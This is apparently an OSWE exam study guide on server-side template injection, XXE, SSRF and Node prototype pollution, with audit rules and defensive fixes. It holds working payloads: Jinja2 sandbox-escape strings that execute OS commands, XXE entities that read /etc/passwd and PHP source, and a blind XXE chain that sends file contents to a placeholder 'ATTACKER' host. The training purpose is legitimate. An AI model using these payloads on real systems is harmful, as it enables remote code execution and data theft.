# Domain 4: SSTI, XXE, SSRF & Prototype Pollution — Study Guide

> **Exam weight:** four high-impact RCE/critical-impact classes that recur on OSWE targets. Each is found the same way: locate the sink in source, confirm untrusted input reaches it, then drive the engine/parser/merge to code execution or internal access.

---

## 1. Server-Side Template Injection (SSTI)

SSTI occurs when user input is **concatenated into a template string that is then compiled**, rather than passed as a bound variable. The engine evaluates attacker expressions.

```text
   SAFE:    render("hello {{ name }}", name=user)     # user is DATA (bound)
   VULN:    render("hello " + user)                   # user becomes TEMPLATE CODE
```

### 1.1 White-box sink identification

Grep for templates built from concatenation/interpolation of user input, per engine:
- **Jinja2 (Python)** `Template(user)` / `render_template_string("..."+user)`
- **Twig (PHP)**, **Freemarker / Velocity / Thymeleaf (Java)**, **Pug / Handlebars / EJS (Node)**, **Razor (.NET)**.

### 1.2 Fingerprint, then escalate

`{{7*7}}`→49 (Jinja2/Twig), `${7*7}`→49 (Freemarker/Velocity/Thymeleaf), `#{7*7}` (others). Then escalate per engine:
- **Jinja2 sandbox escape (Python MRO walk):** from any object, traverse to a class exposing OS access:
  ```text
  {{ ''.__class__.__mro__[1].__subclasses__() }}        # enumerate loaded classes
  {{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
  {{ cycler.__init__.__globals__.os.popen('id').read() }}   # via __globals__
  ```
  The idea: `__class__`→`__mro__`→`__subclasses__()` reaches a class whose `__init__.__globals__` (or constructor) imports `os`, giving `popen`/`system`.
- **Freemarker:** `freemarker.template.utility.Execute` runs OS commands.
- **Thymeleaf:** expression preprocessing (`__${...}__::.x`) can reach executable expressions.
- **Velocity:** reach a `Runtime` via its tool context.

**Audit rule:** any `Template(...)`/`render_*_string(...)` whose argument includes user input is SSTI; a bound variable is safe.

---

## 2. XML External Entity (XXE) Injection

XXE happens when an XML parser resolves external entities in attacker-supplied XML. The fix (and the audit target) is the parser's feature flags.

### 2.1 Parser flags to audit

- **Java `DocumentBuilderFactory`/SAX/StAX:** external entities enabled unless `disallow-doctype-decl`/`external-general-entities` are set to false.
- **PHP libxml:** `LIBXML_NOENT` (and legacy `libxml_disable_entity_loader(false)`) enables entity substitution.
- **.NET `XmlReaderSettings`:** `DtdProcessing=Parse` + a resolver enables external entities.
- **Python `lxml`/`etree`:** `resolve_entities`/`no_network` settings.

### 2.2 Exploitation modes

- **In-band file read:**
  ```text
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]> <r>&x;</r>
  ```
- **PHP base64 wrapper:** read source that would otherwise break XML:
  ```text
  <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=config.php">
  ```
- **Out-of-band (blind):** a remote DTD with a **parameter entity** exfiltrates file contents to your server when no output is reflected:
  ```text
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://ATTACKER/?d=%file;'>">
  %eval; %ex;
  ```
- **Error-based:** provoke a parser error that embeds the file contents in the error message.
- **SSRF via XXE:** point an entity at an internal URL to reach internal services.

---

## 3. Server-Side Request Forgery (SSRF)

SSRF makes the server issue requests to attacker-chosen destinations — reaching internal services behind the perimeter.

- **URL parser differentials:** the validator and the HTTP client parse URLs differently (`http://attacker\@internal`, `http://internal#@attacker`, embedded credentials), so a URL that passes the allow-list is fetched against an internal host.
- **DNS rebinding (TOCTOU):** the validator resolves a hostname to a safe IP, but by fetch time the DNS record has flipped to an internal IP — bypassing time-of-check/time-of-use IP validation.
- **`gopher://` smuggling:** `gopher://` lets you send *arbitrary bytes* over TCP, so an SSRF becomes a way to speak raw protocols to internal services:
  - **Redis:** smuggle commands to write a cron/webshell or `SLAVEOF`.
  - **FastCGI (PHP-FPM):** craft a FastCGI record to execute PHP.
  - **PostgreSQL / internal HTTP microservices:** send protocol-native payloads.

**Audit rule:** any server-side fetch (`curl`, `requests.get`, `URL.openStream`, `file_get_contents($url)`) of a user-supplied URL, especially with a blocklist/allow-list you can bypass, is SSRF.

---

## 4. JavaScript Prototype Pollution

Node.js prototype pollution lets an attacker set properties on `Object.prototype`, so *every* object inherits attacker-controlled values — which downstream code may treat as configuration, reaching RCE.

### 4.1 The sink

A recursive **deep-merge** (or `_.merge`, `Object.assign` loops, query/body parsers) that copies attacker keys including `__proto__`/`constructor.prototype`:

```js
// VULNERABLE deep-merge copies __proto__
merge({}, JSON.parse(req.body));   // body: {"__proto__":{"polluted":"yes"}}
// now ({}).polluted === "yes"  for every object
```

### 4.2 From pollution to RCE (gadgets)

Pollution alone is not RCE; you pollute a property that a *later* sink reads:
- **EJS `outputFunctionName`:** pollute it so EJS compiles attacker code into its template function.
- **Pug** template options similarly.
- **`child_process.fork`/`spawn`:** pollute `shell`, `env`, or `NODE_OPTIONS` (e.g. `--require` a file / `--eval`) so a later child process runs attacker code.

**Audit rule:** find deep-merge/clone of untrusted objects that does not guard `__proto__`/`constructor`/`prototype`, then find a gadget sink that reads a polluted property.

---

## 5. Exploit Automation Notes

For the OSWE script:
- **SSTI:** send the engine-specific RCE payload; URL-encode correctly; catch the shell.
- **Blind XXE:** host the malicious DTD from the script's `ThreadingHTTPServer` and receive the exfiltrated data (or shell) on a listener.
- **SSRF+gopher:** construct the gopher payload (Redis/FastCGI) in the script and deliver it via the vulnerable fetch.
- **Prototype pollution:** send the pollution request, then trigger the gadget request, in sequence.

---

## 6. Defensive & Reporting Takeaways

- **SSTI:** never build templates from user input; pass data as bound context; use sandboxed/logic-less templates (e.g. restrict Jinja2, use Mustache-style).
- **XXE:** disable DOCTYPE/external entities in every parser (`disallow-doctype-decl`, `LIBXML_NOENT` off, `DtdProcessing=Prohibit`, `resolve_entities=False`).
- **SSRF:** allow-list by resolved IP *and* re-validate at fetch time; block internal ranges; disable unneeded URL schemes (`gopher`, `file`, `dict`); isolate egress.
- **Prototype pollution:** guard merges against `__proto__`/`constructor`/`prototype`, use `Map`/null-prototype objects, validate schemas, and freeze prototypes.

---

## Key Audit Commands

```bash
grep -rniE "render_template_string|new Template|Template\(|Freemarker|Velocity|Thymeleaf|handlebars|ejs|pug" src/   # SSTI
grep -rniE "DocumentBuilderFactory|LIBXML_NOENT|XmlReaderSettings|etree|lxml|SAXParser" src/                       # XXE
grep -rniE "requests.get\(|curl_exec|file_get_contents\(\\\$|URL\(|http.get\(|fetch\(" src/                        # SSRF
grep -rniE "merge\(|\\$extend|deepAssign|__proto__|constructor\\.prototype" src/                                   # proto pollution
```

➡️ **Next:** [Exercises.md](./Exercises.md), then [Quiz_1](./Quiz_1.md) (SSTI), [Quiz_2](./Quiz_2.md) (XXE/SSRF), [Quiz_3](./Quiz_3.md) (prototype pollution).
